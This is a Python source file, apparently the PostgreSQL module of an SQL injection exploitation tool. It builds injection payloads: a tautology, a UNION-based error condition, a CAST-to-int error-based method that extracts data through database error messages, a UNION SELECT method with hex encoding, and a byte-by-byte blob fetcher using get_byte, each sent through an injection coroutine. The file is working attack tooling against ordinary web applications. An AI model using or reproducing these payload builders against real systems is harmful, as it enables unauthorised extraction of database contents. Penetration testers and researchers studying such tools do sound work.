from __future__ import annotations

from typing import Any

from ending.ast import *
from ending.ast import NodeType
from ending.db import generic
from ending.db.generic import InjectForBytes
from ending.db.generic.map import MetadataMapper
from ending.exception import ConversionError
from ending.util import quoting

__all__ = [
    "Compiler",
    "SelectMethod",
    "CastAsIntMethod",
    "TestMethod",
    "Mapper",
    "ColonCast",
    "Features",
]


class Features(generic.Features):
    name = "PostgreSQL"
    tautology = "inet_server_addr()=inet_server_addr()"
    quoters = [
        quoting.singlequote,
        quoting.pipes_chr,
        quoting.concat_chr,
    ]
    error_condition: str = "(SELECT 1 UNION SELECT 2 WHERE {condition})={result}"


@node
class ColonCast(Node):
    """A cast with PostgreSQL's `<node>::<cast>` syntax."""

    node: Node
    cast: str

    def _compute_single(self) -> bool:
        return self.node.metadata.single

    def _compute_nullable(self) -> bool:
        return self.node.metadata.nullable


class Compiler(generic.HasConcatWSMixin, generic.Compiler):
    """Compiler for PostgreSQL."""

    def serialize(self, node: Node) -> Node:
        match node.metadata.type:
            case BoolType() as tpe:
                # Casting a bool to text results in "true" or "false".
                # We therefore cast to int before casting to text, getting "0" and "1" back.
                return ColonCast(ColonCast(node, "int"), "text", type=tpe.to_texttype())
            case IntType() as tpe:
                return ColonCast(node, "text", type=tpe.to_texttype())
            case TextType():
                return node
            case BlobType():
                return Hex(node)
            case tpe:
                raise ConversionError(f"Cannot serialize type: {type(tpe).__name__}")

    def _adjust_column(self, column: Node) -> Node:
        match column.metadata.type:
            case UnknownType():
                return ColonCast(column, "text", type=TextType())
            case _:
                return column

    def deserialize(self, type: NodeType, value: bytes) -> Any:
        return super().deserialize(type, value)

    def compile_Query(self, query: Query, s: str) -> str:
        b = []
        q = query.q
        assert len(q.columns) > 0, "Query contains no columns"

        # If the query only consists of one column and nothing else, the SELECT
        # keyword is inessential and can be removed if it is a subquery
        if (
            "p" in s
            and len(q.columns) == 1
            and not (q.distinct or q.table or q.where or q.order or q.limit)
        ):
            return f"{q.columns[0]:p}"

        b.append("SELECT")

        if q.distinct:
            b.append("DISTINCT")

        b.append(self.compile(List[Identifier](q.columns)))

        if q.table:
            b.append(f"FROM {q.table}")

        if q.where:
            b.append(f"WHERE {q.where}")

        if q.order:
            b.append(f"ORDER BY {q.order}")

        if q.limit:
            b.append(f"{q.limit}")

        query = " ".join(b)

        if "p" in s:
            return f"({query})"
        return query

    def compile_Limit(self, limit: Limit, s: str) -> str:
        match limit:
            case Limit(0, y):
                return f"LIMIT {y}"
            case Limit(x, y):
                return f"LIMIT {y} OFFSET {x}"

    def compile_Substring(self, substring: Substring, s):
        return super().compile_Substring(substring, s, "substring")

    def compile_Hex(self, hex: Hex, s: str) -> str:
        # Convert node to text and then to bytes
        if not isinstance(hex.node.metadata.type, BlobType):
            node = self.serialize(hex.node)
            node = ColonCast(Function["REPLACE"](node, "\\", "\\\\"), "bytea")
        else:
            node = hex.node
        return Function["encode"](node, Value("hex"))

    def compile_Ord(self, ord: Ord, s: str):
        match ord.node.metadata.type:
            case BlobType():
                return Function["get_byte"](ord.node, 0)
            case _:
                return Function["ascii"](ord.node)

    def compile_ColonCast(self, coloncast: ColonCast, s: str) -> str:
        # TODO: This seems to be the only node that requires such as specific case
        # The p operator is not enough: we want (x=1)::text, not x=1::text
        node = coloncast.node
        if not isinstance(node, (Identifier, Value, Function, ColonCast)):
            node = f"({node})"
        return f"{node}::{coloncast.cast}"

    def compile_Value(self, value: Value, s: str) -> str:
        if isinstance(value.value, bool):
            return "TRUE" if value.value else "FALSE"
        return super().compile_Value(value, s)


class CastAsIntMethod(generic.ErrorBasedMethod):
    """`CAST(<value> AS int)` error-based SQL injection method.

    Args:
        compiler (Compiler): A DBMS compiler to compile payloads with
        inject (InjectForBytes): An coroutine that sends an SQL payload and
            returns bytes
    """

    def __init__(self, compiler: Compiler, inject: InjectForBytes):
        super().__init__(
            compiler,
            inject,
            pattern=r"""invalid input syntax for (?:type )?integer: ":(.*)""",
        )

    def build_payload(self, query: Query, position: int) -> Node:
        payload = super().build_payload(query, position)
        return Cast(Concatenation((":", payload)), "int") == 1


class SelectMethod(generic.HexSelectMethod):
    def __init__(
        self,
        compiler: Compiler,
        inject: InjectForBytes,
        *,
        nb_rows: int,
        columns: int | list[Node],
        column: int,
        # Modified to None from 1
        # TODO Make this the default for the generic method ?
        dummy_column: Node = Value(None),
        hex: bool = False,
    ):
        super().__init__(
            compiler,
            inject,
            nb_rows=nb_rows,
            columns=columns,
            column=column,
            dummy_column=dummy_column,
            hex=hex,
        )


class BlobCellFetcher(generic.BlobCellFetcher):
    def get_part(self, expr: Node, position: int, length: int) -> Node:
        """Produces a payload that retrieves the byte at index `p` in `expr`."""
        # We directly use get_byte() instead of having get_byte(substring(...), 0)
        assert length == 1
        type = BlobType(byteset=expr.metadata.type.byteset, size=length)
        return Function["get_byte"](expr, position, type=type)

    async def fetch_part_is_in(
        self, expression: Node, candidates: frozenset[int], negate: bool = False
    ) -> bool:
        candidates = self._get_list_of_candidates(candidates)
        payload = expression.is_in(candidates, negate=negate)
        return await self.inject(payload)


class TestMethod(generic.TestMethod):
    def setup_fetchers(self):
        super().setup_fetchers()
        self.fetcher_blob = BlobCellFetcher(self)


class Mapper(MetadataMapper):
    """PostgreSQL mapper."""
